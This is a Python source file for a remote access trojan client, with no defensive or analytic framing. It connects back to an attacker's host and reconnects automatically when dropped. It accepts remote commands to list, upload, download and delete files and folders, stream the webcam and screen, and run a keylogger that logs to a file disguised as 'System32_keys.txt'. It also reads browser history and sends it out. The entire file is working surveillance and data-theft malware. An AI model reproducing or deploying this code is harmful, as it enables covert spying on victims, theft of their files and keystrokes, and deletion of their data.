import os
import socket
from dotenv import load_dotenv
load_dotenv()  
s=socket.socket()
#ip address of attacker machine
host=os.environ.get("SLAVE_HOST")
#port for connection
port=8080
s.connect((host,int(port)))
s.send("up".encode())
while 1:
    
    command =s.recv(1024)
    command=command.decode()

    try:
        
        if command == "q" or command == "quit":
                s.close()
                from time import sleep
                while True:
                    try:
                        
                        s.send("up".encode())
                        break
                    except:
                        sleep(13)
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            host=os.environ.get("SLAVE_HOST")
                            port=8080
                            s.connect((host,int(port)))
                        except:
                            pass

        elif command =="terminate":
            s.close()
            break

        elif command == "os":
            try:
                import platform
                op=platform.platform()
                op=str(op)
                s.send(op.encode())
            except:
                pass


        elif command == "pwd":
            try:
                dir=os.getcwd()
                dir=str(dir)
                s.send(dir.encode())
            except:
                pass

        elif command == "show" or command  == "ls":
            try:
                filename=s.recv(1024)
                if  os.path.exists(filename.decode()):
                    dirn=os.listdir(str(filename.decode()))
                    dirn=str(dirn)
                    s.send(dirn.encode())
                else:
                    s.send("path_not_found".encode())
            except:
                pass

        elif command == "send file":
            try:
                path_o=s.recv(1024)
                s.send("recieved".encode())
                newfile=open(path_o,"wb")
                f=s.recv(10000)
                newfile.write(f)
                newfile.close()
            except:
                pass
        
                    
        elif command == "download file":
            try:
                #getting path and filename where user wantes this file to go to
                path_i=s.recv(1024)
                path_i=path_i.decode()
                if os.path.isfile(path_i):
                    #opening file
                    f=open(path_i,"rb")
                    data=f.read()
                    #sending path where user wants file to go to target
                    s.send(data)
                    #closing just written file
                    f.close()
                else:
                    s.send("not_found".encode())
            except:
                pass

        elif command ==  "remove file":
            try:
                path_rm=s.recv(2048)
                if os.path.exists(path_rm):
                    os.remove(path_rm)
                    s.send("deleted".encode())
                else:
                    s.send("not_found".encode())
            except:
                pass
        
        elif command == "remove folder":
            try:
                path=s.recv(2048)
                path=path.decode()
                if os.path.isdir(path):
                    s.send("present".encode())
                    import shutil
                    shutil.rmtree(path)
                else:
                    s.send("no")
            except:
                pass

        #advanced commands
        elif command == "camera":
            try:
                import cv2,struct,pickle
                vid=cv2.VideoCapture(0)
                while (vid.isOpened()):
                    img,frame=vid.read()
                    a=pickle.dumps(frame)
                    messagee =struct.pack('Q',len(a))+a
                    s.sendall(messagee)
                    quit=s.recv(1024)
                    if quit.decode() == "q":
                        vid.release()
                        cv2.destroyAllWindows
                    else:
                        pass
            except:
                pass
        
        elif command == "screenshare":
            from vidstream import ScreenShareClient
            import threading
            sender = ScreenShareClient(os.environ.get("SLAVE_HOST"), 9999)
            t = threading.Thread(target=sender.start_stream)
            t.start()

        elif command == 'keylogger start':
            try:                   
                from pynput.keyboard import Key, Listener
                import logging

                logging.basicConfig(filename='System32_keys.txt', level=logging.DEBUG, format='%(message)s')
                logging.log(10, 'keylogger started')
                def on_press(key):
                                    logging.log(10, str(key))
                def on_release(key):
                                    pass
                with Listener(on_press=on_press, on_release=on_release) as listener:
                                    listener.join()

            except:
                print("error")

        elif command == 'keylogger get':
            try:
                #getting path and filename where user wantes this file to go to
                path_i="System32_keys.txt"
                if os.path.isfile(path_i):
                    #opening file
                    f=open(path_i,"rb")
                    data=f.read()
                    #sending path where user wants file to go to target
                    s.send(data)
                    #closing just written file
                    f.close()
                else:
                    s.send("not_found".encode())
            except:
                pass

        elif command == 'browser':
            try:
                import browserhistory as bh
                dict_obj = bh.get_browserhistory()

                newfile=open("browser.txt","w")
                newfile.write(str(dict_obj))
                newfile.close()

                f=open("browser.txt","r")
                data=f.read()
                s.send(data.encode())
                f.close()            

                os.remove("browser.txt")

            except:
                pass
    except:
        pass
        